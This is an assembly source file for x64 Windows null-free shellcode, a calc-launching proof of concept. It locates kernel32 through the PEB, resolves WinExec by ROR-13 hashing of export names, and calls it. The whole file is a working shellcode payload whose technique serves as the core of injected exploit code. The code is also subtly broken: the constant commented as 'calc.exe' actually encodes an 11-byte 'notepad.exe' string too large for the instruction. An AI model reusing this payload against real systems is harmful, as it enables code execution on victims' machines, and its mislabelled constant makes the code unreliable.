; calc.asm — x64 NULL-free shellcode
; nasm -f bin calc.asm -o calc.bin
BITS 64

; WinExec ROR-13 hash (pre-computed — no null bytes: 98 FE 8A 0E)
%define WINEXEC_HASH 0x0E8AFE98

_start:
    push  rsi
    push  rdi
    push  rbx
    push  rbp
    push  r12
    push  r15
    and   rsp, -10h             ; FIX: was 0FFFFFFFFFFFFFFF0h (NASM parse error)
    sub   rsp, 20h              ; shadow space

; 1. kernel32 base via PEB ─────────────────────────────────────
    xor   rbp, rbp
    mov   rax, [gs:rbp+60h]    ; PEB    → 65 48 8B 45 60  (no nulls)
    mov   rax, [rax+18h]       ; PEB.Ldr
    mov   rax, [rax+20h]       ; InMemoryOrderModuleList[0] = exe
    mov   rax, [rax]           ; [1] = ntdll
    mov   rax, [rax]           ; [2] = kernel32
    mov   rbx, [rax+20h]       ; DllBase  (InMemoryOrder+0x20)

; 2. export directory ──────────────────────────────────────────
    xor   r12, r12
    mov   r12d, [rbx+3Ch]      ; e_lfanew → NT headers
    add   r12,  rbx            ; IMAGE_NT_HEADERS64 *

    ; ExportDir RVA is at NT+0x88.
    ; 0x88 > 0x7F → 4-byte disp → three null bytes.
    ; Fix: two null-free adds (0x40 + 0x48 = 0x88).
    mov   rdx, r12
    add   rdx, 40h
    add   rdx, 48h             ; rdx = &NT->OptionalHeader.DataDirectory[0].VirtualAddress
    xor   r12, r12
    mov   r12d, [rdx]          ; ExportDir RVA
    add   r12,  rbx            ; IMAGE_EXPORT_DIRECTORY *

; 3. name / ordinal / function arrays ─────────────────────────
    xor   rsi, rsi
    mov   esi, [r12+18h]       ; NumberOfNames
    xor   rdi, rdi
    mov   edi, [r12+20h]       ; AddressOfNames RVA
    add   rdi, rbx             ; AddressOfNames *

; 4. walk names with ROR-13 hash ───────────────────────────────
.next_name:
    dec   rsi
    js    .fail                ; went negative → exhausted

    xor   rax, rax
    mov   eax,  [rdi+rsi*4]   ; Names[i] RVA  → 8B 04 B7
    add   rax,  rbx           ; name string *

    xor   ecx, ecx            ; hash = 0
.hash_char:
    movzx edx, byte [rax]
    test  dl, dl
    jz    .hash_done
    ror   ecx, 0Dh            ; ROR 13
    add   ecx, edx
    inc   rax
    jmp   .hash_char

.hash_done:
    cmp   ecx, WINEXEC_HASH   ; 0x0E8AFE98 — no null bytes ✓
    jne   .next_name

; 5. resolve address ───────────────────────────────────────────
    xor   rdx, rdx
    mov   edx, [r12+24h]      ; AddressOfNameOrdinals RVA
    add   rdx, rbx
    xor   rax, rax
    mov   ax,  [rdx+rsi*2]    ; ordinal index  → 66 8B 04 72

    xor   rdx, rdx
    mov   edx, [r12+1Ch]      ; AddressOfFunctions RVA
    add   rdx, rbx
    mov   eax, [rdx+rax*4]    ; function RVA   → 8B 04 82
    add   rax, rbx            ; absolute address
    mov   r15, rax            ; stash WinExec *

; 6. "calc.exe\0" on the stack (zero byte on stack, not in code)
    xor   rax, rax
    push  rax                 ; null terminator lands on STACK
    mov   rax, 6578652e64617065746f6eh  ; "calc.exe" LE, no null bytes
    push  rax
    mov   rcx, rsp            ; arg1 = lpCmdLine

; 7. call WinExec("calc.exe", SW_SHOWNORMAL) ───────────────────
    xor   edx, edx            ; 31 D2
    inc   edx                 ; FF C2 → edx=1 (not BA 01 00 00 00)
    call  r15                 ; 41 FF D7

.fail:
    add   rsp, 20h
    pop   r15
    pop   r12
    pop   rbp
    pop   rbx
    pop   rdi
    pop   rsi
    ret
